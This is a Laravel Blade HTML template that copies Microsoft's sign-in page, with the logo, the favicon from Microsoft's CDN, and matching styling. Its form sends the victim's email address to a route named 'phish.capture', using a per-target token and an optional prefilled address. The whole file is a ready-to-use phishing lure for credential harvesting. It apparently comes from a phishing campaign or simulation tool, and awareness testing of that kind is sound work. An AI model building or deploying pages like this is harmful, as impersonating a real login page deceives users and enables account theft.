<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Sign in</title>
    <link rel="icon" href="https://logincdn.msauth.net/shared/5/images/favicon_kjp67zc_.ico" type="image/x-icon">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: "Segoe UI", "Segoe UI Web (West European)", -apple-system, "system-ui", Roboto, "Helvetica Neue", sans-serif;
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            color: #242424;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }

        .bg {
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: linear-gradient(135deg, #e8f0fe 0%, #d4e4f7 25%, #f0f4f8 50%, #e8ecf0 75%, #dce3eb 100%);
            z-index: -1;
        }

        .main {
            flex: 1;
            display: flex;
            align-items: flex-start;
            justify-content: center;
            padding: 198px 20px 40px;
        }

        .card {
            width: 100%;
            max-width: 360px;
        }

        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 16px;
        }

        .ms-logo {
            height: 24px;
            width: 108px;
        }

        h1 {
            font-size: 24px;
            font-weight: 600;
            line-height: 32px;
            color: #242424;
            text-align: center;
            margin-bottom: 12px;
        }

        .subtitle {
            font-size: 14px;
            font-weight: 400;
            line-height: 20px;
            color: #424242;
            text-align: center;
            margin-bottom: 32px;
        }

        .form-group {
            position: relative;
            margin-bottom: 18px;
        }

        .form-group input {
            width: 100%;
            height: 38px;
            padding: 6px 18px 6px 6px;
            font-size: 16px;
            font-family: "Segoe UI", sans-serif;
            color: #242424;
            background: transparent;
            border: none;
            border-bottom: 1px solid #767676;
            outline: none;
            border-radius: 0;
        }

        .form-group input:focus {
            border-bottom: 2px solid #0f6cbd;
        }

        .form-group label {
            position: absolute;
            left: 6px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 16px;
            color: #707070;
            pointer-events: none;
            transition: all 0.15s ease;
        }

        .form-group input:focus ~ label,
        .form-group input:not(:placeholder-shown) ~ label {
            top: 0;
            font-size: 10px;
            color: #707070;
            transform: translateY(-50%);
        }

        .forgot-link {
            display: block;
            font-size: 14px;
            font-weight: 600;
            color: #115ea3;
            text-decoration: none;
            margin-bottom: 24px;
        }

        .forgot-link:hover { text-decoration: underline; }

        .btn-next {
            width: 100%;
            height: 38px;
            padding: 8px 16px;
            font-size: 14px;
            font-weight: 600;
            font-family: "Segoe UI", sans-serif;
            color: #fff;
            background: #0f6cbd;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .btn-next:hover { background: #115ea3; }

        .create-account {
            text-align: center;
            margin-top: 32px;
            font-size: 14px;
            color: #424242;
        }

        .create-account a {
            color: #115ea3;
            text-decoration: none;
            font-weight: 600;
        }

        .create-account a:hover { text-decoration: underline; }

        .footer {
            padding: 24px;
            text-align: center;
        }

        .footer-links {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 20px;
            margin-bottom: 8px;
        }

        .footer-links a {
            font-size: 12px;
            color: #424242;
            text-decoration: none;
        }

        .footer-links a:hover { text-decoration: underline; }

        .footer-note {
            font-size: 10px;
            color: #424242;
            text-align: center;
        }

        .footer-note a {
            color: #115ea3;
            font-weight: 600;
            text-decoration: none;
        }

        .footer-note a:hover { text-decoration: underline; }

        @media (max-width: 480px) {
            .card { max-width: 320px; }
        }
    </style>
</head>
<body>
    <div class="bg"></div>
    <div class="main">
        <div class="card">
            <div class="logo">
                <svg class="ms-logo" viewBox="0 0 108 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M0 0h11v11H0z" fill="#f25022"/>
                    <path d="M13 0h11v11H13z" fill="#7fba00"/>
                    <path d="M0 13h11v11H0z" fill="#00a4ef"/>
                    <path d="M13 13h11v11H13z" fill="#ffb900"/>
                    <text x="30" y="18" font-family="Segoe UI" font-size="18" font-weight="600" fill="#242424">Microsoft</text>
                </svg>
            </div>

            <h1>Sign in</h1>
            <p class="subtitle">Use your Microsoft account.</p>

            <form action="{{ route('phish.capture', ['provider' => 'microsoft', 'token' => $token]) }}" method="POST" autocomplete="off">
                @csrf

                <div class="form-group">
                    <input type="email" id="usernameEntry" name="identifier" placeholder=" " autocomplete="username" value="{{ $email ?? '' }}">
                    <label for="usernameEntry">Email or phone number</label>
                </div>

                <a href="#" class="forgot-link">Forgot your username?</a>

                <button type="submit" class="btn-next">Next</button>

                <p class="create-account">New to Microsoft? <a href="#">Create an account</a></p>
            </form>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Help and feedback</a>
            <a href="#">Terms of use</a>
            <a href="#">Privacy and cookies</a>
        </div>
        <p class="footer-note">Use private browsing if this is not your device. <a href="#">Learn more</a></p>
    </div>
</body>
</html>
